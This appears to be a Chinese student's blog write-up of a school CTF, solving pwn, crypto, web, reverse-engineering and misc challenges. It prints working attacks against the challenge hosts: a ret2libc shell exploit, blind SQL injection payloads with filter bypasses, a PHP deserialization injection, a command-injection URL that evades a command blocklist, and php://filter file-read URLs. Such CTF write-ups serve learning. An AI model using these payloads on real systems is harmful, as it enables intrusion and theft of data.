这两天做了学校的CTF，各个类型的简单题倒是都能做出来，但是难度一高就做不出来了

结果虽然做了不少题，分数却不高，还是需要专精一方面呀

八说了，我是垃圾

整理了一下做出来了的各个方面的简单题目Write Up


<!--more-->


## Pwn

### pwnpwnpwn

程序就是输出了一个Ready，然后可以给一个输入，最后退出，程序很简单。

首先checksec发现只开了nx

![image-20200527233640973.png][1]

ida里看到easyabc函数这里存在一个read的溢出，buf到ebp只有88h字节，但是read可以读200h

![image-20200527233810538.png][2]

同时也用到了write函数，可以用ret2libc来做

思路就是，首先溢出用rop跳到write的plt表位置，执行write，输出write的got表内容，即write的真实地址，并且在这个指令下面压栈main函数开始的位置，使得程序调用后能够返回到main再次执行；通过write的真实地址计算出libc的基地址，借此算出`execve`的位置，之后第二次溢出跳转到execve这里，就可以拿到shell

用one gadget搜索execve("/bin/sh")的地址

![image-20200528150101251.png][3]

选一个做返回地址就可以

```python
from pwn import *

io = remote('218.197.154.9',10004)
#io = process('./pwn')
elf = ELF('./pwn')
libc = ELF('./libc-2.23.so')

write_got = elf.got['write']
write_plt = elf.plt['write']

start = elf.sym['main']

payload1 = 'a'*0x88 + 'a'*4 

payload1 += p32(write_plt) + p32(start) +p32(1) + p32(write_got) + p32(4) 

io.sendlineafter('Ready?\n',payload1)

write_real = u32(io.recvline()[:4])

libc_base = write_real - libc.sym['write']

exec_addr = libc_base + 0x3a80c

payload2 = 'a'*0x88 + 'a'*4 + p32(exec_addr)

io.sendline(payload2)
io.interactive()

```



## Crypto

### bivibivi

首先要求算一个同余方程作为proof of work，大概是这样子的

```
x*843 + 542 == 289 mod 1139
```

算的时候用爆破算的

```python
def cal_x(a,b,c,d):
    for i in range(10000000):
        if ((a*i) % d) == (c+d-b)%d:
            print(i)
            break
```

之后题目分成两个阶段，给bv号要求转av号，以及给av号要求转bv号

直接从知乎抄来了一个脚本，一个个运行，最后得到flag

```python
table='fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF'
tr={}
for i in range(58):
    tr[table[i]]=i
s=[11,10,3,8,4,6]
xor=177451812
add=8728348608

def dec(x):
    r=0
    for i in range(6):
	r+=tr[x[s[i]]]*58**i
    return (r-add)^xor

def enc(x):
    x=(x^xor)+add
    r=list('BV1  4 1 7  ')
    for i in range(6):
	r[s[i]]=table[x//58**i%58]
    return ''.join(r)

print(dec('BV18Q4y1A7N2'))
```



### not RSA

首先是proof of work，直接爆破计算hash

```python
import string
import hashlib

def cal_X(suffix,result_hash):
  for a in string.letters+string.digits:
    if hashlib.sha256(a+suffix).hexdigest()==result_hash:
      print(a)
      break
```

之后得到了四个变量的值，p,q,e,c

用yafu计算了一下发现p不是素数

```cmd
factor(xxxxxxx)
```

分解成p1，p2两个数

之后解密得到明文

```python
phi=(p1-1)*(p2-2)*(q-1)
d = gmpy2.invert(e,phi)
print(pow(c,d,n))
```

提示说是hex，转hex之后再转chr得到结果

```python
s="5748554354467b54306c645f79615f6e4f742d5253412e2e2e2e2e2e7d"
result=''
for i in range(29):
    result+=chr(int(s[i*2:i*2+2],16))
    print(result)
```

得到flag



## Web

### Easy_sqli

这个题目访问是一个登录的界面，输入用户名密码

测试了一下发现是盲注，直接用sqlmap没跑通，就手工注入了

页面只返回登录成功或者不成功两种状态，就用布尔型的盲注一点点试字段

过滤了一些字段，可以靠双写绕过

一步步注入的内容

```
user=1'oorr+ascii(substr((selselectect group_concat(table_name) frfromom information_schema.tables whewherere table_schema=database()),{0},1))>{1}--+&pass=123456

user=1'oorr+ascii(substr((seleselectct group_concat(column_name) frfromom information_schema.columns whewherere table_name='users'),{0},1))>{1}--+&pass=123456

user=1'oorr+ascii(substr((seselectlect group_concat(username,0x2b,password) frfromom users),{0},1))>{1}--+&pass=123456

user=1'oorr+ascii(substr((seleselectct group_concat(f1ag) ffromrom f1ag),{0},1))>{1}--+&pass=123456

user=1'oorr+ascii(substr((selselectect group_concat(column_name) frofromm information_schema.columns whewherere table_name='f1ag_y0u_wi1l_n3ver_kn0w'),{0},1))>{1}--+&pass=123456

user=1'oorr+ascii(substr((selselectect group_concat(f111114g) frfromom f1ag_y0u_wi1l_n3ver_kn0w),{0},1))>{1}--+&pass=123456
```



### ezphp

这是一道代码审计的题目，直接给出了源码

```php
<?php 
error_reporting(0); 
highlight_file(__file__); 
$string_1 = $_GET['str1']; 
$string_2 = $_GET['str2']; 

//1st 
if($_GET['num'] !== '23333' && preg_match('/^23333$/', $_GET['num'])){ 
    echo '1st ok'."<br>"; 
} 
else{ 
    die('会代码审计嘛23333'); 
} 


//2nd 
if(is_numeric($string_1)){ 
    $md5_1 = md5($string_1); 
    $md5_2 = md5($string_2); 

    if($md5_1 != $md5_2){ 
        $a = strtr($md5_1, 'pggnb', '12345'); 
        $b = strtr($md5_2, 'pggnb', '12345'); 
        if($a == $b){ 
            echo '2nd ok'."<br>"; 
        } 
        else{ 
            die("can u give me the right str???"); 
        } 
    }  
    else{ 
        die("no!!!!!!!!"); 
    } 
} 
else{ 
    die('is str1 numeric??????'); 
} 

//3nd 
function filter($string){ 
    return preg_replace('/x/', 'yy', $string); 
} 

$username = $_POST['username']; 

$password = "aaaaa"; 
$user = array($username, $password); 

$r = filter(serialize($user)); 
if(unserialize($r)[1] == "123456"){ 
    echo file_get_contents('flag.php'); 
} 
```

整个题目分成了三关，需要绕过三个地方

第一关直接用`%0A`绕过，输入num为`num=23333%0A`这样使得第一次判断和数字不相等，但是正则表达式的匹配那里有因为`%0A`被识别成换行符认为相等

第二关的要求是输入的两个str，其中str1要求是数字，两个数字的md5不相等，但是经过`strtr`处理之后md5必须要相等

这里的处理函数strtr把md5结果里的b替换成了5，而php在比较这些数字时遇到0e开头会认为是科学计数法的表示，因此两个0e开头的md5会被认为相等

爆破找出来一个0e开头，并且后面只有b没有别的字母出现的数字

```python
import hashlib
def md5(f):
    p = hashlib.md5(f).hexdigest()
    return p
for i in range(00, 20000000):
    if '0e' in md5(str(i))[0:2]:
        if 'a' not in md5(str(i))[2:]:
            if 'c' not in md5(str(i))[2:]:
                if 'e' not in md5(str(i))[2:]:
                    if 'd' not in md5(str(i))[2:]:
                        if 'f' not in md5(str(i))[2:]:
                            print 'i:' + str(i) + ' md5:' + md5(str(i))
```

第三关反序列化的属性注入，filter函数把x替换成yy，每一个x多出来一个字符，提交包含20个x的属性就可以就可以

```python
import requests

url = "http://218.197.154.9:10015/?num=23333%0A&str1=11230178&str2=QNKCDZO"

data={"username":"xxxxxxxxxxxxxxxxxxxx\";i:1;s:6:\"123456\";}"}

r = requests.post(url, data)

print(r.text)
```



### ezcmd

这是一道命令执行的题目

```php
<?php 
if(isset($_GET['ip'])){ 
  $ip = $_GET['ip']; 
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){ 
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match); 
    die("fxck your symbol!"); 
  } else if(preg_match("/ /", $ip)){ 
    die("no space!"); 
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){ 
    die("no flag"); 
  } else if(preg_match("/tac|rm|echo|cat|nl|less|more|tail|head/", $ip)){ 
    die("cat't read flag"); 
  } 
  $a = shell_exec("ping -c 4 ".$ip);  
  echo "<pre>"; 
  print_r($a); 
} 
highlight_file(__FILE__); 

?> 
```

过滤了空格，但是这是可以通过`$IFS$`来代替的，使用这个代替空格，分号截断命令；

最后就是指令了，这里看到过滤的东西还是挺多的，但是没有过滤sort以及od，可以通过od读出来flag的8进制，之后再转换成字符串，或者直接用sort读

`http://218.197.154.9:10016/?ip=127.0.0.1;a=g;sort$IFS$1fla$a.php`



### ezinclude

在contact提交之后到thankyou的页面

`http://218.197.154.9:10017/thankyou.php?firstname=1212&lastname=31331&country=australia&subject=dddd`

这里看网页源码有一句注释脑洞，就觉得可能是这个页面的问题

结合题目名称在url里传了个php://filter的参数

`http://218.197.154.9:10017/thankyou.php?file=php://filter/resource=index.php`

页面出现index.php

加上base64转码之后读flag.php就能得到flag

`http://218.197.154.9:10017/thankyou.php?file=php://filter/read=convert.base64-encode/resource=flag.php`



## RE

### RE1

OD打开看到几个约束条件

![image-20200528003831904.png][4]

长度是7

第五位是5

![image-20200528003943129.png][5]
这样的结构出现好几次，相加等于f

满足条件的数字8163574(92)

92在栈里



## RE2

IDA打开，看了基本的逻辑，比较核心的代码差不多就是下面这样

![image-20200528004226325.png][6]

前面经过了一系列操作初始化了四个字节的v14

之后拿输入的内容一个字节一个字节与这个v14异或，放在buf1中

而buf2中是一个固定的结果

buf1和buf2进行比较得到flag

前面一大堆算起来挺麻烦的，结合题目给的hint，提交格式是`flag{xxxx}`，靠这个就能知道前四位和固定串异或的内容，能够得到v14的四个字节

有了这4个字节，再直接与buf2中固定的字符串进行异或，直接就可以得到flag





## MISC

### check-in

附件下载下来是一个git的repository

`git log`看到xinyongpeng的github账号，去找到他的repo里面带flag



### shellOfAwd

流量分析题，附件是一个pcapng文件，打开之后follow tcp stream

请求主要是尝试从index.php请求flag->传了一个shell.php->用shell.php尝试获取flag->绕过层层安全机制，最终获得flag

请求的参数中都是经过了base64的加密，其中上传的shell.php内容是这样的

![image-20200529140520358.png][7]

通过GET确定传输的密钥k，之后用post传具体参数时沿用之前的`session['k']`

在POST的参数里可以知道传的k，之后的通信都使用这样的php脚本进行解密，就可以得到具体传输的内容

前面几个stream搞明白做了什么之后，最后一个stream里面能看到flag

![image-20200528004830115.png][8]

流量数据中的内容经过base64解密可以看到明文

![image-20200528004840930.png][9]

最后是建立了一个软链接把flag写到了jquery里面，最后再读的

![image-20200529141100856.png][10]



![image-20200528015037360.png][11]

读取这个请求的response，经过base64解密得到flag

![image-20200529141122985.png][12]



### wechat_game

之前确实没有接触过微信小程序的东西哎

下载了微信开发者工具

![image-20200529141159410.png][13]

导入项目的源码之后，看到程序要求分数大于2000才能显示flag

修改了重新开始的分数，之后运行时就在console疯狂输出flag

![image-20200529141335128.png][14]

微信小程序开发好像不是很难，和web很像，有时间了也可以看看



### 佛系青年bingge

题目给了很奇怪的一段文字

![image-20200529141457686.png][15]



说的内容复制到`http://www.keyfc.net/bbs/tools/tudoucode.aspx`这个网站解密

得到一个字符串`767566536773bf1ef643676363676784e1d015847635575637560ff4f41d`

用栅栏密码6个一组解密，之后两个一组为hex转字符串，得到flag



### 版权保护

附件是一个文本文件，如果用普通记事本打开就会看到一堆的我最帅

但是用二进制来读，或者用python来读，可以发现里面好多`\u200c`, `\u200d` 

这两个字符在显示时是长度不同的空格，把这两个字符分别当作0、1写到文件里

得到01二进制串

```
01110111011010000111010101100011011101000110011001111011010110010011000001110101010111110110101101101110001100000111011101011111011010000011000001110111010111110111010000110000010111110111000001110010001100000111010001100101011000110111010000110001001100010011000101111101011101110110100001110101011000110111010001100110011110110101100100110000011101010101111101101011011011100011000001110111010111110110100000110000011101110101111101110100001100000101111101110000011100100011000001110100011001010110001101110100001100010011000100110001011111010111011101101000011101010110001101110100011001100111101101011001001100000111010101011111011010110110111000110000011101110101111101101000001100000111011101011111011101000011000001011111011100000111001000110000011101000110010101100011011101000011000100110001001100010111110101110111011010000111010101100011011101000110011001111011010110010011000001110101010111110110101101101110001100000111011101011111011010000011000001110111010111110111010000110000010111110111000001110010001100000111010001100101011000110111010000110001001100010011000101111101011101110110100001110101011000110111010001100110011110110101100100110000011101010101111101101011011011100011000001110111010111110110100000110000011101110101111101110100001100000101111101110000011100100011000001110100011001010110001101110100001100010011000100110001011111010111011101101000011101010110001101110100011001100111101101011001001100000111010101011111011010110110111000110000011101110101111101101000001100000111011101011111011101000011000001011111011100000111001000110000011101000110010101100011011101000011000100110001001100010111110101110111011010000111010101100011011101000110011001111011010110010011000001110101010111110110101101101110001100000111011101011111011010000011000001110111010111110111010000110000010111110111000001110010001100000111010001100101011000110111010000110001001100010011000101111101011101110110100001110101011000110111010001100110011110110101100100110000011101010101111101101011011011100011000001110111010111110110100000110000011101110101111101110100001100000101111101110000011100100011000001110100011001010110001101110100001100010011000100110001011111010111011101101000011101010110001101110100011001100111101101011001001100000111010101011111011010110110111000110000011101110101111101101000001100000111011101011111011101000011000001011111011100000111001000110000011101000110
```

这些字符再8个一组转字符串得到flag

```python
result=''
for i in range(299):
  result+=chr(int(s[i*8:i*8+8],2))
print(result)
```


[1]: http://42.193.111.59/usr/uploads/2021/01/142774245.png#vwid=800&vhei=236
[2]: http://42.193.111.59/usr/uploads/2021/01/1261760502.png#vwid=758&vhei=288
[3]: http://42.193.111.59/usr/uploads/2021/01/977589180.png#vwid=934&vhei=1086
[4]: http://42.193.111.59/usr/uploads/2021/01/2039034173.png#vwid=1056&vhei=238
[5]: http://42.193.111.59/usr/uploads/2021/01/2923994365.png#vwid=1096&vhei=192
[6]: http://42.193.111.59/usr/uploads/2021/01/3793030211.png#vwid=1888&vhei=1116
[7]: http://42.193.111.59/usr/uploads/2021/01/1659873210.png#vwid=1020&vhei=842
[8]: http://42.193.111.59/usr/uploads/2021/01/851317977.png#vwid=2096&vhei=1080
[9]: http://42.193.111.59/usr/uploads/2021/01/4075234465.png#vwid=800&vhei=316
[10]: http://42.193.111.59/usr/uploads/2021/01/3177604200.png#vwid=978&vhei=504
[11]: http://42.193.111.59/usr/uploads/2021/01/2947704399.png#vwid=3294&vhei=2032
[12]: http://42.193.111.59/usr/uploads/2021/01/2209560832.png#vwid=1032&vhei=236
[13]: http://42.193.111.59/usr/uploads/2021/01/1525483634.png#vwid=332&vhei=354
[14]: http://42.193.111.59/usr/uploads/2021/01/495058754.png#vwid=4096&vhei=2560
[15]: http://42.193.111.59/usr/uploads/2021/01/3177978223.png#vwid=996&vhei=1048